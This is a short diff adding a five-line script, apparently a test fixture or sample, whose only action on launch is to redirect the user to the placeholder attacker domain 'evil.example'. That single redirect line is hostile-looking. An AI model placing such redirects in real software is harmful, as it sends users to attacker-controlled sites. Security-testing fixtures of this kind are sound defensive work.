@@ -1,0 +1,5 @@
+use web
+
+launch {
+    show web.redirect("https://evil.example")
+}
